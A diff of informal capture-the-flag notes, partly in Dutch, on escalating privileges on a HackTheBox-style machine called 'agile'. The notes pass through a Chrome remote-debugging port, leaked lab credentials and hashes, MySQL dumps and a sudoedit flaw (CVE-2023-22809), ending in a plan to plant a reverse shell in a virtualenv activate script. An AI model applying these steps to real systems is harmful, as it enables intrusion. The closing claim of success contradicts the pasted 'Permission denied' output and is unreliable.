@@ -154,4 +154,116 @@ kunnen we inloggen op via ssh op corum:5db7caa1d13cc37c9fc2
 we zien dat er nog een service draait: agile.htb dit is een precies niet heel specieaal
 In /opt zien we dat een chrome draaid van runner. Deze heeft ook remote debugging enabled dit kan een mogelijke horizontal escalation vector zijn. 
 
+We voeren linpeas uit en we zien dat user runner is running chrome with remote debugging on. The command running is the following:
 
+/opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=15422 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1678242339194496 --launch-time-ticks=29063589190 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,7272906161225018755,7450614449098406324,131072 --disable-features=PaintHolding
+runner     15449  0.0  2.1 33871408 84944 ?      Sl   10:30   0:00            
+
+
+the --remote-debugging-port=41829 is collored red-orange meaning it's very likely a PE vector.
+Using chrome we can see the password of edwards is d07867c6267dcb5df0af
+
+edwards can run sudoedit /app/config_test.json & /app/app-testing/tests/functional/creds.txt 
+
+In this file we found other login creds for edwards: 
+
+creds.txt
+edwards:1d7ffjwrx#$d6qn!9nndqgde4
+
+config_test.json
+{
+    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
+}
+
+In de database vinden we de hash voor edwards:$6$rounds=200000$tXCy.rfqmsaJqOoA$Pu1DcBDRZt4a6OGO35cdU4fd7mlhPthDpMcQBOclCuhW1hnAIk1aj/itcJIQ8lIhRHxSZNe4I.5aqaTtkWtnr0
+
+Edwards has the right to open 2 files from dev_admin using sudoedit this has a vulnerability that allowes us to open any file that dev_admin can open.
+https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc
+
+we look at the files that are from dev_admin
+
+find / -user dev_admin 2> /dev/null
+/home/dev_admin
+/app/app-testing/tests/functional/creds.txt
+/app/config_test.json
+/app/config_prod.json
+
+
+config_prod.json could be interesting. This gives us the following:
+
+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass
+
+In this database we find nothing of importance:
+
+
+show databases
+    -> ;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| performance_schema |
+| superpass          |
++--------------------+
+3 rows in set (0.00 sec)
+
+mysql> use superpass;
+Database changed
+mysql> show tables;
++---------------------+
+| Tables_in_superpass |
++---------------------+
+| passwords           |
+| users               |
++---------------------+
+2 rows in set (0.01 sec)
+
+mysql> select * from users
+    -> ;
++----+----------+--------------------------------------------------------------------------------------------------------------------------+
+| id | username | hashed_password                                                                                                          |
++----+----------+--------------------------------------------------------------------------------------------------------------------------+
+|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
+|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
++----+----------+--------------------------------------------------------------------------------------------------------------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from passwords;
++----+---------------------+---------------------+----------------+----------+----------------------+---------+
+| id | created_date        | last_updated_data   | url            | username | password             | user_id |
++----+---------------------+---------------------+----------------+----------+----------------------+---------+
+|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
+|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
+|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
+|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
+|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
++----+---------------------+---------------------+----------------+----------+----------------------+---------+
+
+This information isn't new. We go back to the exploit of writing files of dev_admin
+
+These are the files that dev_admin can write to:
+
+/home/dev_admin
+/app/venv
+/app/venv/bin
+/app/venv/bin/activate
+/app/venv/bin/Activate.ps1
+/app/venv/bin/activate.fish
+/app/venv/bin/activate.csh
+
+
+app/venv/bin/activate gets executed everytime the app restarts If we add a reverse shell into this code it might get hit and have root access.
+
+
+sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt                                                                                           
+> BINGO! User exploitable
+> Opening sudoers file, please add the following line to the file in order to do the privesc:
+edwards ALL=(ALL:ALL) ALL
+exploit.sh: 39: read: Illegal option -n
+[sudo] password for edwards: 
+sudoedit: --: Permission denied
+2 files to edit
+sudoedit: /app/app-testing/tests/functional/creds.txt unchanged
+
+
+This works and gives a reverse shell!!
